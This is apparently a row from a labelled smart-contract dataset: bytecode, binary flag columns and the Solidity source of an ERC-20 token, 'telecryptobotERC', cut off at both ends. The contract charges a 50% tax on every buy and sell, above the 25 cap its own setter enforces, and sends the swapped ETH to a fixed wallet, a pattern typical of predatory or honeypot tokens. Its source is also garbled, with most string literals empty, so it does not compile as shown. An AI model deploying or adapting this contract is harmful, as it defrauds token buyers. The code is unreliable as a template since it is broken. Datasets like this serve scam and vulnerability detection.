4051600060405180830381858888f193505050501580156121e2573d6000803e3d6000fd5b5050565b600060065482111561222d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161222490613b2f565b60405180910390fd5b6000612237612507565b905061224c818461253290919063ffffffff16565b915050919050565b60016015806101000a81548160ff0219169083151502179055506000600267ffffffffffffffff81111561228b5761228a612c2b565b5b6040519080825280602002602001820160405280156122b95781602001602082028036833780820191505090505b50905030816000815181106122d1576122d0613344565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff1681525050601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ad5c46486040518163ffffffff1660e01b815260040160206040518083038186803b15801561237357600080fd5b505afa158015612387573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906123ab9190613b64565b816001815181106123bf576123be613344565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505061242630601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16846116c6565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663791ac9478360008430426040518663ffffffff1660e01b815260040161248a959493929190613c8a565b600060405180830381600087803b1580156124a457600080fd5b505af11580156124b8573d6000803e3d6000fd5b505050505060006015806101000a81548160ff02191690831515021790555050565b806124e8576124e761257c565b5b6124f38484846125bf565b806125015761250061278a565b5b50505050565b600080600061251461279e565b9150915061252b818361253290919063ffffffff16565b9250505090565b600061257483836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506127fd565b905092915050565b6000600c5414801561259057506000600d54145b1561259a576125bd565b600c54600e81905550600d54600f819055506000600c819055506000600d819055505b565b6000806000806000806125d187612860565b95509550955095509550955061262f86600260008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546128c890919063ffffffff16565b600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506126c485600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461291290919063ffffffff16565b600260008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061271081612970565b61271a8483612a2d565b8773ffffffffffffffffffffffffffffffffffffffff168973ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef856040516127779190612ff4565b60405180910390a3505050505050505050565b600e54600c81905550600f54600d81905550565b600080600060065490506000670de0b6b3a764000090506127d2670de0b6b3a764000060065461253290919063ffffffff16565b8210156127f057600654670de0b6b3a76400009350935050506127f9565b81819350935050505b9091565b60008083118290612844576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161283b9190612e9d565b60405180910390fd5b50600083856128539190613474565b9050809150509392505050565b600080600080600080600080600061287d8a600c54600d54612a67565b925092509250600061288d612507565b905060008060006128a08e878787612afd565b9250925092508282828989899c509c509c509c509c509c505050505050505091939550919395565b600061290a83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250612116565b905092915050565b600080828461292191906139a1565b905083811015612966576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161295d90613d30565b60405180910390fd5b8091505092915050565b600061297a612507565b905060006129918284612b8690919063ffffffff16565b90506129e581600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461291290919063ffffffff16565b600260003073ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b612a42826006546128c890919063ffffffff16565b600681905550612a5d8160075461291290919063ffffffff16565b6007819055505050565b600080600080612a936064612a85888a612b8690919063ffffffff16565b61253290919063ffffffff16565b90506000612abd6064612aaf888b612b8690919063ffffffff16565b61253290919063ffffffff16565b90506000612ae682612ad8858c6128c890919063ffffffff16565b6128c890919063ffffffff16565b905080838395509550955050505093509350939050565b600080600080612b168589612b8690919063ffffffff16565b90506000612b2d8689612b8690919063ffffffff16565b90506000612b448789612b8690919063ffffffff16565b90506000612b6d82612b5f85876128c890919063ffffffff16565b6128c890919063ffffffff16565b9050838184965096509650505050509450945094915050565b600080831415612b995760009050612bfb565b60008284612ba791906133eb565b9050828482612bb69190613474565b14612bf6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401612bed90613dc2565b60405180910390fd5b809150505b92915050565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b612c6382612c1a565b810181811067ffffffffffffffff82111715612c8257612c81612c2b565b5b80604052505050565b6000612c95612c01565b9050612ca18282612c5a565b919050565b600067ffffffffffffffff821115612cc157612cc0612c2b565b5b602082029050602081019050919050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000612d0282612cd7565b9050919050565b612d1281612cf7565b8114612d1d57600080fd5b50565b600081359050612d2f81612d09565b92915050565b6000612d48612d4384612ca6565b612c8b565b90508083825260208201905060208402830185811115612d6b57612d6a612cd2565b5b835b81811015612d945780612d808882612d20565b845260208401935050602081019050612d6d565b5050509392505050565b600082601f830112612db357612db2612c15565b5b8135612dc3848260208601612d35565b91505092915050565b600060208284031215612de257612de1612c0b565b5b600082013567ffffffffffffffff811115612e0057612dff612c10565b5b612e0c84828501612d9e565b91505092915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015612e4f578082015181840152602081019050612e34565b83811115612e5e576000848401525b50505050565b6000612e6f82612e15565b612e798185612e20565b9350612e89818560208601612e31565b612e9281612c1a565b840191505092915050565b60006020820190508181036000830152612eb78184612e64565b905092915050565b6000819050919050565b612ed281612ebf565b8114612edd57600080fd5b50565b600081359050612eef81612ec9565b92915050565b60008060408385031215612f0c57612f0b612c0b565b5b6000612f1a85828601612d20565b9250506020612f2b85828601612ee0565b9150509250929050565b60008115159050919050565b612f4a81612f35565b82525050565b6000602082019050612f656000830184612f41565b92915050565b6000819050919050565b6000612f90612f8b612f8684612cd7565b612f6b565b612cd7565b9050919050565b6000612fa282612f75565b9050919050565b6000612fb482612f97565b9050919050565b612fc481612fa9565b82525050565b6000602082019050612fdf6000830184612fbb565b92915050565b612fee81612ebf565b82525050565b60006020820190506130096000830184612fe5565b92915050565b60008060006060848603121561302857613027612c0b565b5b600061303686828701612d20565b935050602061304786828701612d20565b925050604061305886828701612ee0565b9150509250925092565b600060ff82169050919050565b61307881613062565b82525050565b6000602082019050613093600083018461306f565b92915050565b6130a281612cf7565b82525050565b60006020820190506130bd6000830184613099565b92915050565b6000602082840312156130d9576130d8612c0b565b5b60006130e784828501612d20565b91505092915050565b6130f981612f35565b811461310457600080fd5b50565b600081359050613116816130f0565b92915050565b60006020828403121561313257613131612c0b565b5b600061314084828501613107565b91505092915050565b60006020828403121561315f5761315e612c0b565b5b600061316d84828501612ee0565b91505092915050565b600080600080608085870312156131905761318f612c0b565b5b600061319e87828801612ee0565b94505060206131af87828801612ee0565b93505060406131c087828801612ee0565b92505060606131d187828801612ee0565b91505092959194509250565b600080fd5b60008083601f8401126131f8576131f7612c15565b5b8235905067ffffffffffffffff811115613215576132146131dd565b5b60208301915083602082028301111561323157613230612cd2565b5b9250929050565b60008060006040848603121561325157613250612c0b565b5b600084013567ffffffffffffffff81111561326f5761326e612c10565b5b61327b868287016131e2565b9350935050602061328e86828701613107565b9150509250925092565b600080604083850312156132af576132ae612c0b565b5b60006132bd85828601612d20565b92505060206132ce85828601612d20565b9150509250929050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b600061330e602083612e20565b9150613319826132d8565b602082019050919050565b6000602082019050818103600083015261333d81613301565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006133ad82612ebf565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156133e0576133df613373565b5b600182019050919050565b60006133f682612ebf565b915061340183612ebf565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff048311821515161561343a57613439613373565b5b828202905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061347f82612ebf565b915061348a83612ebf565b92508261349a57613499613445565b5b828204905092915050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b6000613501602683612e20565b915061350c826134a5565b604082019050919050565b60006020820190508181036000830152613530816134f4565b9050919050565b7f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b6000613593602483612e20565b915061359e82613537565b604082019050919050565b600060208201905081810360008301526135c281613586565b9050919050565b7f45524332303a20617070726f766520746f20746865207a65726f20616464726560008201527f7373000000000000000000000000000000000000000000000000000000000000602082015250565b6000613625602283612e20565b9150613630826135c9565b604082019050919050565b6000602082019050818103600083015261365481613618565b9050919050565b7f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008201527f6472657373000000000000000000000000000000000000000000000000000000602082015250565b60006136b7602583612e20565b91506136c28261365b565b604082019050919050565b600060208201905081810360008301526136e6816136aa565b9050919050565b7f45524332303a207472616e7366657220746f20746865207a65726f206164647260008201527f6573730000000000000000000000000000000000000000000000000000000000602082015250565b6000613749602383612e20565b9150613754826136ed565b604082019050919050565b600060208201905081810360008301526137788161373c565b9050919050565b7f5472616e7366657220616d6f756e74206d75737420626520677265617465722060008201527f7468616e207a65726f0000000000000000000000000000000000000000000000602082015250565b60006137db602983612e20565b91506137e68261377f565b604082019050919050565b6000602082019050818103600083015261380a816137ce565b9050919050565b7f544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e642060008201527f746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400602082015250565b600061386d603f83612e20565b915061387882613811565b604082019050919050565b6000602082019050818103600083015261389c81613860565b9050919050565b7f544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000600082015250565b60006138d9601c83612e20565b91506138e4826138a3565b602082019050919050565b60006020820190508181036000830152613908816138cc565b9050919050565b7f544f4b454e3a20596f7572206163636f756e7420697320626c61636b6c69737460008201527f6564210000000000000000000000000000000000000000000000000000000000602082015250565b600061396b602383612e20565b91506139768261390f565b604082019050919050565b6000602082019050818103600083015261399a8161395e565b9050919050565b60006139ac82612ebf565b91506139b783612ebf565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156139ec576139eb613373565b5b828201905092915050565b7f544f4b454e3a2042616c616e636520657863656564732077616c6c657420736960008201527f7a65210000000000000000000000000000000000000000000000000000000000602082015250565b6000613a53602383612e20565b9150613a5e826139f7565b604082019050919050565b60006020820190508181036000830152613a8281613a46565b9050919050565b6000613a9482612ebf565b9150613a9f83612ebf565b925082821015613ab257613ab1613373565b5b828203905092915050565b7f416d6f756e74206d757374206265206c657373207468616e20746f74616c207260008201527f65666c656374696f6e7300000000000000000000000000000000000000000000602082015250565b6000613b19602a83612e20565b9150613b2482613abd565b604082019050919050565b60006020820190508181036000830152613b4881613b0c565b9050919050565b600081519050613b5e81612d09565b92915050565b600060208284031215613b7a57613b79612c0b565b5b6000613b8884828501613b4f565b91505092915050565b6000819050919050565b6000613bb6613bb1613bac84613b91565b612f6b565b612ebf565b9050919050565b613bc681613b9b565b82525050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b613c0181612cf7565b82525050565b6000613c138383613bf8565b60208301905092915050565b6000602082019050919050565b6000613c3782613bcc565b613c418185613bd7565b9350613c4c83613be8565b8060005b83811015613c7d578151613c648882613c07565b9750613c6f83613c1f565b925050600181019050613c50565b5085935050505092915050565b600060a082019050613c9f6000830188612fe5565b613cac6020830187613bbd565b8181036040830152613cbe8186613c2c565b9050613ccd6060830185613099565b613cda6080830184612fe5565b9695505050505050565b7f536166654d6174683a206164646974696f6e206f766572666c6f770000000000600082015250565b6000613d1a601b83612e20565b9150613d2582613ce4565b602082019050919050565b60006020820190508181036000830152613d4981613d0d565b9050919050565b7f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f60008201527f7700000000000000000000000000000000000000000000000000000000000000602082015250565b6000613dac602183612e20565b9150613db782613d50565b604082019050919050565b60006020820190508181036000830152613ddb81613d9f565b905091905056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a26469706673582212205c7a6b557a7bf2725cc3d5fa81e7ab23ce2192e3ba327cf90a3b4330b8d2e25e64736f6c63430008090033,0,0,0,0,0,0,0,1,0,1,1,0,1,1,0,0,0
"pragma solidity ^0.8.9;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value );}contract Ownable is Context { address private _owner; address private _previousOwner; event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }}interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity );}contract telecryptobotERC is Context, IERC20, Ownable { using SafeMath for uint256; string private constant _name = ; string private constant _symbol = ; uint8 private constant _decimals = 9; mapping(address => uint256) private _rOwned; mapping(address => uint256) private _tOwned; mapping(address => mapping(address => uint256)) private _allowances; mapping(address => bool) private _isExcludedFromFee; uint256 private constant MAX = ~uint256(0); uint256 private constant _tTotal = 100000000 * 10**9; uint256 private _rTotal = (MAX - (MAX % _tTotal)); uint256 private _tFeeTotal; uint256 private _redisFeeOnBuy = 0; uint256 private _taxFeeOnBuy = 50; uint256 private _redisFeeOnSell = 0; uint256 private _taxFeeOnSell =50; uint256 private _redisFee = _redisFeeOnSell; uint256 private _taxFee = _taxFeeOnSell; uint256 private _previousredisFee = _redisFee; uint256 private _previoustaxFee = _taxFee; address payable private _developmentAddress = payable(0x66CFF3Dd6eFBECd6D9Cd91Bf5d1b6b263A205325); address payable private _marketingAddress = payable(0x66CFF3Dd6eFBECd6D9Cd91Bf5d1b6b263A205325); IUniswapV2Router02 public uniswapV2Router; address public uniswapV2Pair; bool private tradingOpen = true; bool private inSwap = false; bool private swapEnabled = true; uint256 public _maxTxAmount = _tTotal; uint256 public _maxWalletSize = _tTotal*5/100; uint256 public _swapTokensAtAmount = _tTotal*4/1000; event MaxTxAmountUpdated(uint256 _maxTxAmount); modifier lockTheSwap { inSwap = true; _; inSwap = false; } constructor() { _rOwned[_msgSender()] = _rTotal; IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH()); _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_marketingAddress] = true; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public pure returns (string memory) { return _name; } function symbol() public pure returns (string memory) { return _symbol; } function decimals() public pure returns (uint8) { return _decimals; } function totalSupply() public pure override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public override returns (bool) { _transfer(sender, recipient, amount); _approve( sender, _msgSender(), _allowances[sender][_msgSender()].sub( amount, ) ); return true; } function tokenFromReflection(uint256 rAmount) private view returns (uint256) { require( rAmount <= _rTotal, ); uint256 currentRate = _getRate(); return rAmount.div(currentRate); } function removeAllFee() private { if (_redisFee == 0 && _taxFee == 0) return; _previousredisFee = _redisFee; _previoustaxFee = _taxFee; _redisFee = 0; _taxFee = 0; } function restoreAllFee() private { _redisFee = _previousredisFee; _taxFee = _previoustaxFee; } function _approve( address owner, address spender, uint256 amount ) private { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer( address from, address to, uint256 amount ) private { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); if (from != owner() && to != owner()) { if (!tradingOpen) { require(from == owner(), ); } require(amount <= _maxTxAmount, ); if(to != uniswapV2Pair) { require(balanceOf(to) + amount < _maxWalletSize, ); } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= _swapTokensAtAmount; if(contractTokenBalance >= _swapTokensAtAmount*3) { contractTokenBalance = _swapTokensAtAmount*3; } if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) { swapTokensForEth(contractTokenBalance); uint256 contractETHBalance = address(this).balance; if (contractETHBalance > 50000000000000000) { sendETHToFee(contractETHBalance); } } } bool takeFee = true; if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) { takeFee = false; } else { if(from == uniswapV2Pair && to != address(uniswapV2Router)) { _redisFee = _redisFeeOnBuy; _taxFee = _taxFeeOnBuy; } if (to == uniswapV2Pair && from != address(uniswapV2Router)) { _redisFee = _redisFeeOnSell; _taxFee = _taxFeeOnSell; } } _tokenTransfer(from, to, amount, takeFee); } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function sendETHToFee(uint256 amount) private { _marketingAddress.transfer(amount); } function manualsend() external { sendETHToFee(address(this).balance); } function manualSwap(uint256 percent) external onlyOwner { uint256 contractTokenBalance = balanceOf(address(this)); uint256 swapamount = contractTokenBalance*percent/100; swapTokensForEth(swapamount); } function toggleSwap (bool _swapEnabled) external onlyOwner { swapEnabled = _swapEnabled; } function _tokenTransfer( address sender, address recipient, uint256 amount, bool takeFee ) private { if (!takeFee) removeAllFee(); _transferStandard(sender, recipient, amount); if (!takeFee) restoreAllFee(); } function _transferStandard( address sender, address recipient, uint256 tAmount ) private { ( uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam ) = _getValues(tAmount); _rOwned[sender] = _rOwned[sender].sub(rAmount); _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); _takeTeam(tTeam); _reflectFee(rFee, tFee); emit Transfer(sender, recipient, tTransferAmount); } function _takeTeam(uint256 tTeam) private { uint256 currentRate = _getRate(); uint256 rTeam = tTeam.mul(currentRate); _rOwned[address(this)] = _rOwned[address(this)].add(rTeam); } function _reflectFee(uint256 rFee, uint256 tFee) private { _rTotal = _rTotal.sub(rFee); _tFeeTotal = _tFeeTotal.add(tFee); } receive() external payable {} function _getValues(uint256 tAmount) private view returns ( uint256, uint256, uint256, uint256, uint256, uint256 ) { (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _taxFee); uint256 currentRate = _getRate(); (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate); return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam); } function _getTValues( uint256 tAmount, uint256 redisFee, uint256 taxFee ) private pure returns ( uint256, uint256, uint256 ) { uint256 tFee = tAmount.mul(redisFee).div(100); uint256 tTeam = tAmount.mul(taxFee).div(100); uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam); return (tTransferAmount, tFee, tTeam); } function _getRValues( uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate ) private pure returns ( uint256, uint256, uint256 ) { uint256 rAmount = tAmount.mul(currentRate); uint256 rFee = tFee.mul(currentRate); uint256 rTeam = tTeam.mul(currentRate); uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam); return (rAmount, rTransferAmount, rFee); } function _getRate() private view returns (uint256) { (uint256 rSupply, uint256 tSupply) = _getCurrentSupply(); return rSupply.div(tSupply); } function _getCurrentSupply() private view returns (uint256, uint256) { uint256 rSupply = _rTotal; uint256 tSupply = _tTotal; if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); return (rSupply, tSupply); } function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner { _redisFeeOnBuy = redisFeeOnBuy; _redisFeeOnSell = redisFeeOnSell; _taxFeeOnBuy = taxFeeOnBuy; _taxFeeOnSell = taxFeeOnSell; require (_redisFeeOnBuy+_redisFeeOnSell+_taxFeeOnBuy+_taxFeeOnSell <= 25); } function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner { _maxTxAmount = _tTotal*maxTxAmount/100; require (_maxTxAmount >= _tTotal/100); } function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner { _maxWalletSize = _tTotal*maxWalletSize/100; require (_maxWalletSize >= _tTotal/100); }}",0x6080604052600436106101445760003560e01c8063715018a6116100b6578063a2a957bb1161006f578063a2a957bb1461039f578063a9059cbb146103bf578063b70143c9146103df578063dd62ed3e146103ff578063ea1644d514610445578063f2fde38b1461046557600080fd5b8063715018a6146102f457806374010ece146103095780637d1db4a5146103295780638da5cb5b1461033f5780638f9a55c01461035d57806395d89b411461037357600080fd5b80632fd689e3116101085780632fd689e31461024b578063313ce5671461026157806349bd5a5e1461027d5780636d8aa8f81461029d5780636fc3eaec146102bf57806370a08231146102d457600080fd5b806306fdde0314610150578063095ea7b31461019e5780631694505e146101ce57806318160ddd1461020657806323b872dd1461022b57600080fd5b3661014b57005b600080fd5b34801561015c57600080fd5b5060408051808201909152601381527215195b1959dc985b4810dc9e5c1d1bc8109bdd606a1b60208201525b60405161019591906115ab565b60405180910390f35b3480156101aa57600080fd5b506101be6101b936600461160e565b610485565b6040519015158152602001610195565b3480156101da57600080fd5b506012546101ee906001600160a01b031681565b6040516001600160a01b039091168152602001610195565b34801561021257600080fd5b5067016345785d8a00005b604051908152602001610195565b34801561023757600080fd5b506101be61024636600461163a565b61049c565b34801561025757600080fd5b5061021d60165481565b34801561026d57600080fd5b5060405160098152602001610195565b34801561028957600080fd5b506013546101ee906001600160a01b031681565b3480156102a957600080fd5b506102bd6102b836600461167b565b610505565b005b3480156102cb57600080fd5b506102bd610556565b3480156102e057600080fd5b5061021d6102ef36600461169d565b610561565b34801561030057600080fd5b506102bd610583565b34801561031557600080fd5b506102bd6103243660046116ba565b6105f7565b34801561033557600080fd5b5061021d60145481565b34801561034b57600080fd5b506000546001600160a01b03166101ee565b34801561036957600080fd5b5061021d60155481565b34801561037f57600080fd5b506040805180820190915260038152622a21a160e91b6020820152610188565b3480156103ab57600080fd5b506102bd6103ba3660046116d3565b610666565b3480156103cb57600080fd5b506101be6103da36600461160e565b6106d7565b3480156103eb57600080fd5b506102bd6103fa3660046116ba565b6106e4565b34801561040b57600080fd5b5061021d61041a366004611705565b6001600160a01b03918216600090815260046020908152604080832093909416825291909152205490565b34801561045157600080fd5b506102bd6104603660046116ba565b610743565b34801561047157600080fd5b506102bd61048036600461169d565b6107af565b6000610492338484610899565b5060015b92915050565b60006104a98484846109bd565b6104fb84336104f68560405180606001604052806028815260200161188d602891396001600160a01b038a1660009081526004602090815260408083203384529091529020549190610e7c565b610899565b5060019392505050565b6000546001600160a01b031633146105385760405162461bcd60e51b815260040161052f9061173e565b60405180910390fd5b60138054911515600160b01b0260ff60b01b19909216919091179055565b61055f47610eb6565b565b6001600160a01b03811660009081526002602052604081205461049690610ef4565b6000546001600160a01b031633146105ad5760405162461bcd60e51b815260040161052f9061173e565b600080546040516001600160a01b03909116907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0908390a3600080546001600160a01b0319169055565b6000546001600160a01b031633146106215760405162461bcd60e51b815260040161052f9061173e565b60646106358267016345785d8a0000611789565b61063f91906117a0565b601455610655606467016345785d8a00006117a0565b601454101561066357600080fd5b50565b6000546001600160a01b031633146106905760405162461bcd60e51b815260040161052f9061173e565b6008849055600a8390556009829055600b819055601981836106b286886117c2565b6106bc91906117c2565b6106c691906117c2565b11156106d157600080fd5b50505050565b60006104923384846109bd565b6000546001600160a01b0316331461070e5760405162461bcd60e51b815260040161052f9061173e565b600061071930610561565b9050600060646107298484611789565b61073391906117a0565b905061073e81610f78565b505050565b6000546001600160a01b0316331461076d5760405162461bcd60e51b815260040161052f9061173e565b60646107818267016345785d8a0000611789565b61078b91906117a0565b6015556107a1606467016345785d8a00006117a0565b601554101561066357600080fd5b6000546001600160a01b031633146107d95760405162461bcd60e51b815260040161052f9061173e565b6001600160a01b03811661083e5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b606482015260840161052f565b600080546040516001600160a01b03808516939216917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e091a3600080546001600160a01b0319166001600160a01b0392909216919091179055565b6001600160a01b0383166108fb5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b606482015260840161052f565b6001600160a01b03821661095c5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840161052f565b6001600160a01b0383811660008181526004602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b6001600160a01b038316610a215760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b606482015260840161052f565b6001600160a01b038216610a835760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b606482015260840161052f565b60008111610ae55760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b606482015260840161052f565b6000546001600160a01b03848116911614801590610b1157506000546001600160a01b03838116911614155b15610d7557601354600160a01b900460ff16610baa576000546001600160a01b03848116911614610baa5760405162461bcd60e51b815260206004820152603f60248201527f544f4b454e3a2054686973206163636f756e742063616e6e6f742073656e642060448201527f746f6b656e7320756e74696c2074726164696e6720697320656e61626c656400606482015260840161052f565b601454811115610bfc5760405162461bcd60e51b815260206004820152601c60248201527f544f4b454e3a204d6178205472616e73616374696f6e204c696d697400000000604482015260640161052f565b6013546001600160a01b03838116911614610c815760155481610c1e84610561565b610c2891906117c2565b10610c815760405162461bcd60e51b815260206004820152602360248201527f544f4b454e3a2042616c616e636520657863656564732077616c6c65742073696044820152627a652160e81b606482015260840161052f565b6000610c8c30610561565b6016549091508082101590610ca2906003611789565b8210610cb957601654610cb6906003611789565b91505b808015610cd05750601354600160a81b900460ff16155b8015610cea57506013546001600160a01b03868116911614155b8015610cff5750601354600160b01b900460ff165b8015610d2457506001600160a01b03851660009081526005602052604090205460ff16155b8015610d4957506001600160a01b03841660009081526005602052604090205460ff16155b15610d7257610d5782610f78565b4766b1a2bc2ec50000811115610d7057610d7081610eb6565b505b50505b6001600160a01b03831660009081526005602052604090205460019060ff1680610db757506001600160a01b03831660009081526005602052604090205460ff165b80610de957506013546001600160a01b03858116911614801590610de957506013546001600160a01b03848116911614155b15610df657506000610e70565b6013546001600160a01b038581169116148015610e2157506012546001600160a01b03848116911614155b15610e3357600854600c55600954600d555b6013546001600160a01b038481169116148015610e5e57506012546001600160a01b03858116911614155b15610e7057600a54600c55600b54600d555b6106d1848484846110f2565b60008184841115610ea05760405162461b